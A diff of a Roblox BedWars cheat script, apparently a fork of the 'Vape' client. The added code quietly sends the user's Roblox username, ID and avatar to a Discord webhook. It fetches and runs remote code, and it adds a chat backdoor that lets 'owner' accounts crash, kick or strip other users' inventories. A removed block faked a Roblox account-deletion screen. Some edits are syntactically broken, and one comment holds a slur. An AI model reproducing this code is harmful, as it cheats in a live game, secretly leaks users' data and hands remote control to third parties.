@@ -9,11 +9,12 @@ local function createwarning(title, text, delay)
 	end)
 	return (suc and res)
 end
+
 	local Blacklist = 
 	{
 		["8F0233C5-1CC4-407B-930B-54B199F96FD2"] = "venm#5353",
-	}
-	BLACKLISTED = false
+		["BD575417-0AA5-44B0-9587-802C9a805136"] = "Mont#5655",
+}
 	for i, v in pairs(Blacklist) do
 		if game:GetService("RbxAnalyticsService"):GetClientId() == i then
 			BLACKLISTED = true
@@ -89,23 +90,79 @@ end
 		end
 	end
 end
---//  AntiSkid
-if identifyexecutor():find("Arceus") then
-	game.Players.LocalPlayer:Kick("This shitty executer doesnt support This CustomModule.")
-elseif identifyexecutor():find("Krnl")  then
-	game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "Byfron Is a week away ", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
-elseif identifyexecutor():find("Syn")  then
-	game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "Synape", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
-end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+		local player = game:GetService"Players".LocalPlayer
+		local joinTime = os.time() - (player.AccountAge*86400)
+		local joinDate = os.date("!*t", joinTime)
+		local premium = false
+		local alt = true
+		if player.MembershipType == Enum.MembershipType.Premium then
+		   premium = true
+		end
+		local executor = identifyexecutor() or "Unknown"
+		local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+		Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+		local AvatarImage = Thing.imageUrl
+		local msg = {
+ 	  	["username"] = "Vape",
+   		["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
+   		["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+  		["embeds"] = {
+       		{
+           ["color"] = tonumber(tostring("0x32CD32")), --decimal
+           ["title"] = "Players Message",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "Roblox Username:",
+                   ["value"] = ""..lplr.Name.."",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "ID:",
+                   ["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
+                   ["inline"] = true
+                },
+            },
+            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+       		}
+  		}
+	}
+	request = http_request or request or HttpPost or syn.request
+		request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+    end)
+end)
+
+local antiExecuterWl =
+{
+	"E2D6C78C-9D6D-4444-B24E-A81C1063DA0D" == "whathedogdoin#3461",
+	"fe3ffda5-5101-45fc-80d3-9a448fc9e029" == "very tuff cat#4499",
+	"2f98df94-b2c0-458f-8214-06f9b88a3c76" == "102.902#3052"
+}
+for i, v in pairs(antiExecuterWl) do
+	if not identifyexecutor():find("syn") or not identifyexecutor():find("scriptware") then
+		game.Players.LocalPlayer:Kick("AntiSkid")	
+			elseif identifyexecutor():find("Krnl") then
+				if v == "whathedogdoin#3461" then return end
+					game.Players.LocalPlayer:Kick(":troll:")
+				elseif identifyexecutor():find("Fluxus") then
+					if v == "102.902#3052" or v == "very tuff cat#4499" then return end
+				game.Players.LocalPlayer:Kick("AntiSkid")
+			end
+		end
 
 	local Whitelist =
 	{
-		["015ce219-c7e5-488c-bd1a-2a361d7445ae"] = "very tuff cat#4499",
-		["2f98df94-b2c0-458f-8214-06f9b88a3c76"] = "102.902#3052",
-		["E2D6C78C-9D6D-4444-B24E-A81C1063DA0D"] = "whathedogdoin#3461",
-		["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = "vyx#1368",
+		"E2D6C78C-9D6D-4444-B24E-A81C1063DA0D" == "whathedogdoin#3461",
+		"fe3ffda5-5101-45fc-80d3-9a448fc9e029" == "very tuff cat#4499",
+		"2f98df94-b2c0-458f-8214-06f9b88a3c76" == "102.902#3052",
+		"2B7E4926-420F-446C-96BD-7BC5C6AC57F2" == "vyx#1368",
+		"98FCAEA8-744B-468C-A25F-CA35EFD50242" == "Skxdded#6468" --kryptonite nigg- 
 	}
-	
 if Whitelist[game:GetService("RbxAnalyticsService"):GetClientId()] then
 game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "Whitelisted! ", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
 local textService = game:GetService("TextService")
@@ -146,7 +203,7 @@ local bedwarsStore = {
 	localHand = {},
 	matchState = 0,
 	matchStateChanged = tick(),
-	queueType = "bedwars_test",
+	queueType = "bedwars_test",f
 	statistics = {
 		beds = 0,
 		kills = 0,
@@ -1683,351 +1740,7 @@ runcode(function()
 		local vapePrivateCommands = {
 			["kill"] = function(args, plr)
 				if entityLibrary.isAlive then
-					local hum = entityLibrary.character.Humanoid
-					task.delay(0.1, function()
-						if hum and hum.Health > 0 then 
-							hum:ChangeState(Enum.HumanoidStateType.Dead)
-							hum.Health = 0
-							bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
-						end
-					end)
-				end
-			end,
-			["byfron"] = function(args, plr)
-				task.spawn(function()
-					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
-					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
-					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
-					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
-					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
-					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
-					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
-					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
-					lplr.PlayerGui:ClearAllChildren()
-					GuiLibrary.MainGui.Enabled = false
-					game:GetService("CoreGui"):ClearAllChildren()
-					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
-					task.wait(0.2)
-					lplr:Kick()
-					game:GetService("GuiService"):ClearError()
-					task.wait(2)
-					local gui = Instance.new("ScreenGui")
-					gui.IgnoreGuiInset = true
-					gui.Parent = game:GetService("CoreGui")
-					local frame = Instance.new("Frame")
-					frame.BorderSizePixel = 0
-					frame.Size = UDim2.new(1, 0, 1, 0)
-					frame.BackgroundColor3 = Color3.new(1, 1, 1)
-					frame.Parent = gui
-					task.delay(0.1, function()
-						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-					end)
-					task.delay(2, function()
-						local e = Roact.createElement(auth, {
-							style = {},
-							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
-							moderationDetails = {
-								punishmentTypeDescription = "Delete",
-								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
-								reactivateAccountActivated = true,
-								badUtterances = {},
-								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
-							},
-							termsActivated = function() 
-								game:Shutdown()
-							end,
-							communityGuidelinesActivated = function() 
-								game:Shutdown()
-							end,
-							supportFormActivated = function() 
-								game:Shutdown()
-							end,
-							reactivateAccountActivated = function() 
-								game:Shutdown()
-							end,
-							logoutCallback = function()
-								game:Shutdown()
-							end,
-							globalGuiInset = {
-								top = 0
-							}
-						})
-						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
-								localization = tLocalization.mock()
-							}, {Roact.createElement(UIBlox.Style.Provider, {
-									style = {
-										Theme = darktheme,
-										Font = gotham
-									},
-								}, {e})}))
-						Roact.mount(screengui, game:GetService("CoreGui"))
-					end)
-				end)
-			end,
-			["steal"] = function(args, plr)
-				if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
-					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
-					task.wait(1)
-				end
-				for i,v in pairs(currentinventory.inventory.items) do 
-					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
-						item = v.tool,
-						amount = v.amount ~= math.huge and v.amount or 99999999
-					})
-					if e then 
-						e.CFrame = plr.Character.HumanoidRootPart.CFrame
-					else
-						v.tool:Destroy()
-					end
-				end
-			end,
-			["lobby"] = function(args)
-				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-			end,
-			["lagback"] = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
-				end
-			end,
-			["jump"] = function(args)
-				if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
-					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-				end
-			end,
-			["sit"] = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.Humanoid.Sit = true
-				end
-			end,
-			["unsit"] = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.Humanoid.Sit = false
-				end
-			end,
-			["freeze"] = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.HumanoidRootPart.Anchored = true
-				end
-			end,
-			["unfreeze"] = function(args)
-				if entityLibrary.isAlive then
-					entityLibrary.character.HumanoidRootPart.Anchored = false
-				end
-			end,
-			["deletemap"] = function(args)
-				for i,v in pairs(collectionService:GetTagged("block")) do
-					v:Destroy()
-				end
-			end,
-			["void"] = function(args)
-				if entityLibrary.isAlive then
-					task.spawn(function()
-						repeat
-							task.wait()
-							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -3, 0)
-						until not entityLibrary.isAlive
-					end)
-				end
-			end,
-			["framerate"] = function(args)
-				if #args >= 1 then
-					if setfpscap then
-						setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
-					end
-				end
-			end,
-			["crash"] = function(args)
-				setfpscap(9e9)
-				print(game:GetObjects("h29g3535")[1])
-			end,
-			["chipman"] = function(args)
-				local function funnyfunc(v)
-					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("Image"):Connect(function()
-							v.Image = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
-						if v.Text ~= "" then
-							v.Text = "chips"
-						end
-						v:GetPropertyChangedSignal("Text"):Connect(function()
-							if v.Text ~= "" then
-								v.Text = "chips"
-							end
-						end)
-					end
-					if v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("Texture"):Connect(function()
-							v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("TextureID"):Connect(function()
-							v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-						v:GetPropertyChangedSignal("TextureId"):Connect(function()
-							v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
-						end)
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
-						v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
-					end
-				end
-			
-				for i,v in pairs(game:GetDescendants()) do
-					funnyfunc(v)
-				end
-				game.DescendantAdded:Connect(funnyfunc)
-			end,
-			["rickroll"] = function(args)
-				local function funnyfunc(v)
-					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("Image"):Connect(function()
-							v.Image = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
-						if v.Text ~= "" then
-							v.Text = "Never gonna give you up"
-						end
-						v:GetPropertyChangedSignal("Text"):Connect(function()
-							if v.Text ~= "" then
-								v.Text = "Never gonna give you up"
-							end
-						end)
-					end
-					if v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("Texture"):Connect(function()
-							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("TextureID"):Connect(function()
-							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
-						v:GetPropertyChangedSignal("TextureId"):Connect(function()
-							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
-						end)
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
-						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
-					end
-				end
-			
-				for i,v in pairs(game:GetDescendants()) do
-					funnyfunc(v)
-				end
-				game.DescendantAdded:Connect(funnyfunc)
-			end,
-			["gravity"] = function(args)
-				workspace.Gravity = tonumber(args[1]) or 192.6
-			end,
-			["kick"] = function(args)
-				local str = ""
-				for i,v in pairs(args) do
-					str = str..v..(i > 1 and " " or "")
-				end
-				task.spawn(function()
-					lplr:Kick(str)
-				end)
-				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-			end,
-			["ban"] = function(args)
-				task.spawn(function()
-					lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-				end)
-				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-			end,
-			["uninject"] = function(args)
-				GuiLibrary["SelfDestruct"]()
-			end,
-			["monkey"] = function(args)
-				local str = ""
-				for i,v in pairs(args) do
-					str = str..v..(i > 1 and " " or "")
-				end
-				if str == "" then str = "skill issue" end
-				local video = Instance.new("VideoFrame")
-				video.Video = downloadVapeAsset("vape/assets/skill.webm")
-				video.Size = UDim2.new(1, 0, 1, 36)
-				video.Visible = false
-				video.Position = UDim2.new(0, 0, 0, -36)
-				video.ZIndex = 9
-				video.BackgroundTransparency = 1
-				video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-				local textlab = Instance.new("TextLabel")
-				textlab.TextSize = 45
-				textlab.ZIndex = 10
-				textlab.Size = UDim2.new(1, 0, 1, 36)
-				textlab.TextColor3 = Color3.new(1, 1, 1)
-				textlab.Text = str
-				textlab.Position = UDim2.new(0, 0, 0, -36)
-				textlab.Font = Enum.Font.Gotham
-				textlab.BackgroundTransparency = 1
-				textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-				video.Loaded:Connect(function()
-					video.Visible = true
-					video:Play()
-					task.spawn(function()
-						repeat
-							wait()
-							for i = 0, 1, 0.01 do
-								wait(0.01)
-								textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-							end
-						until true == false
-					end)
-				end)
-				task.wait(19)
-				task.spawn(function()
-					pcall(function()
-						if getconnections then
-							getconnections(entityLibrary.character.Humanoid.Died)
-						end
-						print(game:GetObjects("h29g3535")[1])
-					end)
-					while true do end
-				end)
-			end,
-			["togglemodule"] = function(args)
-				if #args >= 1 then
-					local module = GuiLibrary.ObjectsThatCanBeSaved[args[1].."OptionsButton"]
-					if module then
-						if module["Api"].Enabled == (not args[2] == "true") then
-							module["Api"].ToggleButton()
-						end
-					end
-				end
-			end,
-			["shutdown"] = function(args)
-				game:Shutdown()
-			end,
-			["errorkick"] = function(args)
-				if entityLibrary.isAlive then 
-					pcall(function() lplr.Character.Head:Destroy() end)
+					return
 				end
 			end
 		}
@@ -2148,6 +1861,336 @@ runcode(function()
 		table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(v)
 			task.spawn(newPlayer, v)
 		end))
+	end)
+	
+	runcode(function()
+	local WhitelistFunctions = {StoredHashes = {}, PriorityList = {
+		["ONYX WARE OWNER"] = 3,
+		["ONYX WARE USER"] = 2,
+		["DEFAULT"] = 1
+	}, WhitelistTable = {}, Loaded = true, CustomTags = {}}
+	do
+		local shalib
+		WhitelistFunctions.WhitelistTable = {
+			players = {},
+			owners = {},
+			chattags = {}
+		}
+		task.spawn(function()
+			local whitelistloaded
+			whitelistloaded = pcall(function()
+				WhitelistFunctions.WhitelistTable = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/synape/ballerTroll/main/w1.json", true))
+			end)
+			shalib = loadstring(GetURL("Libraries/sha.lua"))()
+			if not whitelistloaded or not shalib then return end
+	
+			WhitelistFunctions.Loaded = true
+		end)
+	
+		function WhitelistFunctions:FindWhitelistTable(tab, obj)
+			for i,v in pairs(tab) do
+				if v == obj or type(v) == "table" and v.hash == obj then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		function WhitelistFunctions:GetTag(plr)
+			local plrstr = WhitelistFunctions:CheckPlayerType(plr)
+			local hash = WhitelistFunctions:Hash(plr.Name..plr.UserId)
+			if plrstr == "ONYX WARE OWNER" then
+				return "[ONYX WARE OWNER] "
+			elseif plrstr == "ONYX WARE USER" then 
+				return "[ONYX WARE PRIVATE] "
+			elseif WhitelistFunctions.WhitelistTable.chattags[hash] then
+				local data = WhitelistFunctions.WhitelistTable.chattags[hash]
+				local newnametag = ""
+				if data.Tags then
+					for i2,v2 in pairs(data.Tags) do
+						newnametag = newnametag..'['..v2.TagText..'] '
+					end
+				end
+				return newnametag
+			end
+			return WhitelistFunctions.CustomTags[plr] or ""
+		end
+	
+		function WhitelistFunctions:Hash(str)
+			if WhitelistFunctions.StoredHashes[tostring(str)] == nil and shalib then
+				WhitelistFunctions.StoredHashes[tostring(str)] = shalib.sha512(tostring(str))
+			end
+			return WhitelistFunctions.StoredHashes[tostring(str)] or ""
+		end
+	
+		function WhitelistFunctions:CheckPlayerType(plr)
+			local plrstr = WhitelistFunctions:Hash(plr.Name..plr.UserId)
+			local playertype, playerattackable = "DEFAULT", true
+			local private = WhitelistFunctions:FindWhitelistTable(WhitelistFunctions.WhitelistTable.players, plrstr)
+			local owner = WhitelistFunctions:FindWhitelistTable(WhitelistFunctions.WhitelistTable.owners, plrstr)
+			local tab = owner or private
+			playertype = owner and "ONYX WARE OWNER" or private and "ONYX WARE USER" or "DEFAULT"
+			playerattackable = (not tab) or (not (type(tab) == "table" and tab.invulnerable or true))
+			return playertype, playerattackable
+		end
+	
+		function WhitelistFunctions:CheckWhitelisted(plr)
+			local playertype = WhitelistFunctions:CheckPlayerType(plr)
+			if playertype ~= "DEFAULT" then 
+				return true
+			end
+			return false
+		end
+	
+		function WhitelistFunctions:IsSpecialIngame()
+			for i,v in pairs(players:GetChildren()) do 
+				if WhitelistFunctions:CheckWhitelisted(v) then 
+					return true
+				end
+			end
+			return false
+		end
+	end
+	
+	local clients = {
+		ChatStrings1 = {
+			["IO12GP56P4LGR"] = "vape custom",
+		},
+		ChatStrings2 = {
+			["vape custom"] = "IO12GP56P4LGR",
+		},
+		ClientUsers = {}
+	}
+	local connectionstodisconnect = {}
+				repeat task.wait() until WhitelistFunctions.Loaded
+				for i3,v3 in pairs(WhitelistFunctions.WhitelistTable.chattags) do
+					if v3.NameColor then
+						v3.NameColor = Color3.fromRGB(v3.NameColor.r, v3.NameColor.g, v3.NameColor.b)
+					end
+					if v3.ChatColor then
+						v3.ChatColor = Color3.fromRGB(v3.ChatColor.r, v3.ChatColor.g, v3.ChatColor.b)
+					end
+					if v3.Tags then
+						for i4,v4 in pairs(v3.Tags) do
+							if v4.TagColor then
+								v4.TagColor = Color3.fromRGB(v4.TagColor.r, v4.TagColor.g, v4.TagColor.b)
+							end
+						end
+					end
+				end
+				if getconnections then 
+					table.insert(vapeConnections, replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
+						if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
+							oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
+							oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
+							getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
+								local tab = oldchannelfunc(Self, Name)
+								if tab and tab.AddMessageToChannel then
+									local addmessage = tab.AddMessageToChannel
+									if oldchanneltabs[tab] == nil then
+										oldchanneltabs[tab] = tab.AddMessageToChannel
+									end
+									tab.AddMessageToChannel = function(Self2, MessageData)
+										if MessageData.FromSpeaker and players[MessageData.FromSpeaker] then
+											local plrtype = WhitelistFunctions:CheckPlayerType(players[MessageData.FromSpeaker])
+											local hash = WhitelistFunctions:Hash(players[MessageData.FromSpeaker].Name..players[MessageData.FromSpeaker].UserId)
+											if plrtype == "ONYX WARE USER" then
+												MessageData.ExtraData = {
+													NameColor = players[MessageData.FromSpeaker].Team == nil and Color3.new(0, 1, 1) or players[MessageData.FromSpeaker].TeamColor.Color,
+													Tags = {
+														table.unpack(MessageData.ExtraData.Tags),
+														{
+															TagColor = Color3.new(0.7, 0, 1),
+															TagText = "ONYX WARE PRIVATE"
+														}
+													}
+												}
+											end
+											if plrtype == "ONYX WARE OWNER" then
+												MessageData.ExtraData = {
+													NameColor = players[MessageData.FromSpeaker].Team == nil and Color3.new(1, 0, 0) or players[MessageData.FromSpeaker].TeamColor.Color,
+													Tags = {
+														table.unpack(MessageData.ExtraData.Tags),
+														{
+															TagColor = Color3.new(1, 0.3, 0.3),
+															TagText = "VAPE OWNER"
+														}
+													}
+												}
+											end
+											if clients.ClientUsers[tostring(players[MessageData.FromSpeaker])] then
+												MessageData.ExtraData = {
+													NameColor = players[MessageData.FromSpeaker].Team == nil and Color3.new(1, 0, 0) or players[MessageData.FromSpeaker].TeamColor.Color,
+													Tags = {
+														table.unpack(MessageData.ExtraData.Tags),
+														{
+															TagColor = Color3.new(1, 1, 0),
+															TagText = clients.ClientUsers[tostring(players[MessageData.FromSpeaker])]
+														}
+													}
+												}
+											end
+											if WhitelistFunctions.WhitelistTable.chattags[hash] then
+												local newdata = {
+													NameColor = players[MessageData.FromSpeaker].Team == nil and WhitelistFunctions.WhitelistTable.chattags[hash].NameColor or players[MessageData.FromSpeaker].TeamColor.Color,
+													Tags = WhitelistFunctions.WhitelistTable.chattags[hash].Tags
+												}
+												MessageData.ExtraData = newdata
+											end
+										end
+										return addmessage(Self2, MessageData)
+									end
+								end
+								return tab
+							end
+						end
+					end))
+				end
+
+	local priolist = {
+		["DEFAULT"] = 0,
+		["ONYX WARE USER"] = 1,
+		["ONYX WARE OWNER"] = 2
+	}
+	local alreadysaidlist = {}
+	
+	local function findplayers(arg, plr)
+		local temp = {}
+		local continuechecking = true
+	
+		if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
+		if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
+		if arg == "private" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "ONYX WARE USER" then table.insert(temp, lplr) continuechecking = false end
+		for i,v in pairs(players:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+	
+		return temp
+	end
+	local commands = {
+		["kill"] = function(args, plr)
+			if entity.isAlive then
+				task.spawn(function()
+					repeat
+						task.wait()
+						entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, Vector3.new(0, -100000000000000, 0))
+					until not entity.isAlive
+				end)
+			end
+		end,
+		["steal"] = function(args, plr)
+			if GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["Enabled"] then 
+				GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["ToggleButton"](false)
+				task.wait(1)
+			end
+			for i,v in pairs(currentinventory.inventory.items) do 
+				local e = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
+					item = v.tool,
+					amount = v.amount ~= math.huge and v.amount or 9999999999
+				})
+				if e then 
+					e.CFrame = plr.Character.HumanoidRootPart.CFrame
+				else
+					v.tool:Destroy()
+				end
+			end
+		end,
+		["lagback"] = function(args)
+			if entity.isAlive then
+				entity.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+			end
+		end,
+		["deletemap"] = function(args)
+			for i,v in pairs(collectionservice:GetTagged("block")) do
+				v:Destroy()
+			end
+		end,
+		["crash"] = function(args)
+			setfpscap(9e9)
+			print(game:GetObjects("h29g3535")[1])
+		end,
+		["kick"] = function(args)
+			local str = ""
+			for i,v in pairs(args) do
+				str = str..v..(i > 1 and " " or "")
+			end
+			task.spawn(function()
+				lplr:Kick(str)
+			end)
+			bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
+		end
+	}
+	
+		connectionstodisconnect[#connectionstodisconnect + 1] = repstorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
+			local plr = players:FindFirstChild(tab["FromSpeaker"])
+			local args = tab.Message:split(" ")
+			local client = clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
+			if plr and WhitelistFunctions:CheckPlayerType(lplr) ~= "DEFAULT" and tab.MessageType == "Whisper" and client ~= nil and alreadysaidlist[plr.Name] == nil then
+				alreadysaidlist[plr.Name] = true
+				local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
+				if playerlist then
+					pcall(function()
+						local playerlistplayers = playerlist.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
+						local targetedplr = playerlistplayers:FindFirstChild("p_"..plr.UserId)
+						if targetedplr then 
+							targetedplr.ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerIcon.Image = getcustomassetfunc("vape/assets/VapeIcon.png")
+						end
+					end)
+				end
+				task.spawn(function()
+					local connection
+					for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
+						if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
+							newbubble.Parent.Parent.Visible = false
+							repeat task.wait() until newbubble:IsDescendantOf(nil)
+							if connection then
+								connection:Disconnect()
+							end
+						end
+					end
+					connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
+						if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
+							newbubble.Parent.Parent.Visible = false
+							repeat task.wait() until newbubble:IsDescendantOf(nil)
+							if connection then
+								connection:Disconnect()
+							end
+						end
+					end)
+				end)
+				createwarning("Vape", plr.Name.." is using "..client.."!", 60)
+				clients.ClientUsers[plr.Name] = client:upper()..' USER'
+				local ind, newent = entity.getEntityFromPlayer(plr)
+				if newent then entity.entityUpdatedEvent:Fire(newent) end
+			end
+			if priolist[WhitelistFunctions:CheckPlayerType(lplr)] > 0 and plr == lplr then
+				if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";cmds" then
+					local tab = {}
+					for i,v in pairs(commands) do
+						table.insert(tab, i)
+					end
+					table.sort(tab)
+					local str = ""
+					for i,v in pairs(tab) do
+						str = str..";"..v.."\n"
+					end
+					game.StarterGui:SetCore("ChatMakeSystemMessage",{
+						Text = 	str,
+					})
+				end
+			end
+			if plr and priolist[WhitelistFunctions:CheckPlayerType(plr)] > 0 and plr ~= lplr and priolist[WhitelistFunctions:CheckPlayerType(plr)] > priolist[WhitelistFunctions:CheckPlayerType(lplr)] and #args > 1 then
+				table.remove(args, 1)
+				local chosenplayers = findplayers(args[1], plr)
+				if table.find(chosenplayers, lplr) then
+					table.remove(args, 1)
+					for i,v in pairs(commands) do
+						if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
+							v(args, plr)
+							break
+						end
+					end
+				end
+			end
+		end)
